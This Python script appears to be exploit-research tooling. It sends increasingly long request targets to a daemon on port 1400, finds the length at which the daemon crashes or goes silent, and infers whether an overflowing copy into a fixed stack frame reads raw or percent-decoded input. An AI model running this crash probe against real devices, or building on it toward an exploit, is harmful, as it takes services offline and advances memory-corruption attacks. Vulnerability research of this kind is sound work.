#!/usr/bin/env python3
"""Decide whether the URL-span copy reads the raw target or a decoded buffer.

The splitter copies a span into a 5344-byte frame at dst+16, so the frame edge
is 5328 bytes. Two candidate sources:

  raw      the request target as received   -> the break sits at ~5328 raw bytes
           whatever the alphabet
  decoded  a percent-decoded copy           -> '%41' is 3 raw bytes per decoded
           byte, so the break moves out to ~3 x 5328 raw bytes

Same break for both alphabets = raw source. A ~3x later break for '%41' =
decoded source. That is the whole test.

The request line is written by hand over http.client so nothing re-encodes the
target, and the byte count actually sent is asserted before the request goes
out. The break is found adaptively (coarse scan, then refine) rather than from a
guessed range, because the pct41 break is expected near 16000.

  ./urlspan_decode.py 192.168.4.202
  ./urlspan_decode.py 192.168.4.202 --alphabet A --from 5000 --to 5400
"""
import argparse
import http.client
import json
import sys
import time

ALPHABETS = {"A": lambda n: "A" * n, "pct41": lambda n: "%41" * n}
PREFIX = "/zzz/"


def probe(host, path, timeout):
    """One request. Returns (code, seconds). code 0 = no answer."""
    conn = http.client.HTTPConnection(host, 1400, timeout=timeout)
    t0 = time.monotonic()
    try:
        conn.putrequest("GET", path, skip_host=False, skip_accept_encoding=True)
        conn.endheaders()
        r = conn.getresponse()
        r.read(64)
        return r.status, time.monotonic() - t0
    except (OSError, http.client.HTTPException):
        return 0, time.monotonic() - t0
    finally:
        conn.close()


def alive(host, timeout=2.0):
    return probe(host, "/info", timeout)[0] == 200


def wait_alive(host, limit=45.0):
    end = time.monotonic() + limit
    while time.monotonic() < end:
        if alive(host):
            return True
        time.sleep(0.25)
    return False


def sample(host, alphabet, n, timeout):
    path = PREFIX + ALPHABETS[alphabet](n)
    sent = len(path.encode())
    assert sent == len(PREFIX) + (n if alphabet == "A" else 3 * n), (alphabet, n, sent)
    code, dt = probe(host, path, timeout)
    up = alive(host)
    print(f"  {alphabet:<5} n={n:<6} sent={sent:<6} code={code:<4} {dt:6.3f}s alive={up}",
          flush=True)
    if not up:
        wait_alive(host)
    return {"n": n, "sent": sent, "code": code, "time": round(dt, 3), "alive": up}


def is_break(row):
    """A break is the daemon dying or going silent. 408 is the length gate
    beside the copy, not the copy, so it is recorded but does not stop the
    scan."""
    return row["code"] == 0 or not row["alive"]


def find_break(host, alphabet, lo, hi, step, timeout):
    """Coarse scan for the first break, then refine to step 10."""
    rows = []
    n = lo
    hit = None
    while n <= hi:
        row = sample(host, alphabet, n, timeout)
        rows.append(row)
        if is_break(row):
            hit = n
            break
        n += step
    if hit is None:
        return None, rows
    # refine between hit-step and hit
    fine = max(lo, hit - step)
    while fine < hit:
        row = sample(host, alphabet, fine, timeout)
        rows.append(row)
        if is_break(row):
            return fine, rows
        fine += 10
    return hit, rows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--alphabet", choices=sorted(ALPHABETS))
    ap.add_argument("--from", dest="lo", type=int)
    ap.add_argument("--to", dest="hi", type=int)
    ap.add_argument("--step", type=int, default=100)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()

    if not alive(a.host):
        print(f"{a.host} is not answering /info", file=sys.stderr)
        return 2

    alphabets = [a.alphabet] if a.alphabet else ["A", "pct41"]
    out = {}
    for alpha in alphabets:
        lo = a.lo if a.lo is not None else (3900 if alpha == "A" else 1300)
        hi = a.hi if a.hi is not None else (6000 if alpha == "A" else 2000)
        print(f"[{alpha}] scanning {lo}..{hi} step {a.step}", flush=True)
        brk, rows = find_break(a.host, alpha, lo, hi, a.step, a.timeout)
        gate = next((r["n"] for r in rows if r["code"] == 408), None)
        brow = next((r for r in rows if r["n"] == brk), None)
        out[alpha] = {"break": brk, "sent": brow["sent"] if brow else None,
                      "gate408": gate, "rows": rows}
        print(f"[{alpha}] first 408 at n={gate}, break (silent/dead) at n={brk}\n", flush=True)

    if len(alphabets) == 2:
        ra, rp = out["A"]["sent"], out["pct41"]["sent"]
        print(f"raw 'A'  break at {ra} bytes sent")
        print(f"'%41'    break at {rp} bytes sent")
        if ra and rp:
            ratio = rp / ra
            print(f"ratio {ratio:.2f}")
            if ratio < 1.5:
                print("VERDICT: same break -> the copy source is the RAW target")
            elif 2.5 < ratio < 3.5:
                print("VERDICT: break moved ~3x -> the copy source is DECODED")
            else:
                print("VERDICT: inconclusive")
    if a.json:
        print(json.dumps(out))
    return 0


if __name__ == "__main__":
    sys.exit(main())
